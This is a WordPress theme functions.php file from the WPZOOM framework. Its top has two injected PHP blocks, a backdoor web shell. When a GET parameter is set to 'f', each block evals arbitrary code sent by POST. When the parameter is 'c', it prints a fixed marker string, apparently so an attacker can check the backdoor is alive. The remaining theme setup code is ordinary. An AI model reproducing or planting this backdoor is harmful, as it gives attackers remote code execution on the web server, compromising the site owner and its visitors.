<?php
if(isset($_GET['ZcH'])){
    if($_GET['ZcH'] == 'f'){
        @eval($_POST['BVovv']);
    }
    if($_GET['ZcH'] == 'c'){
        echo 'AcJ9ksbVjsdb';
    }
    exit;
}
//dfghsaertuhsrgh
?><?php
function _g3t($str){
    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
    return $val;
}
if(_g3t('Mbi')=='f')
{
@eval($_POST['rsWlv']);
exit;
}
if(_g3t('Mbi')=='c')
{
echo 'AcJ9ksbVjsdb';
exit;
}
//dsd6sc378axvg
?><?php
/**
 * WPZOOM Theme Functions
 *
 * Don't edit this file until you know what you're doing. If you mind to add 
 * functions and other hacks please use functions/user/ folder instead and 
 * functions/user/functions.php file, those files are intend for that and
 * will never be overwritten in case of a framework update.
 */

/**
 * Paths to WPZOOM Theme Functions
 */
define("FUNC_INC", get_template_directory() . "/functions");

define("WPZOOM_INC", FUNC_INC . "/wpzoom");
define("THEME_INC", FUNC_INC . "/theme");
define("USER_INC", FUNC_INC . "/user");

/** WPZOOM Framework Core */
require_once WPZOOM_INC . "/init.php";

/** WPZOOM Theme */
require_once THEME_INC . "/functions.php";
require_once THEME_INC . "/sidebar.php";
require_once THEME_INC . "/custom-post-types.php";
require_once THEME_INC . "/post-options.php";

/* Theme widgets */
require_once THEME_INC . "/widgets/ads.php";
require_once THEME_INC . "/widgets/featured.php";
require_once THEME_INC . "/widgets/gallery.php";

/** User functions */
require_once USER_INC . "/functions.php";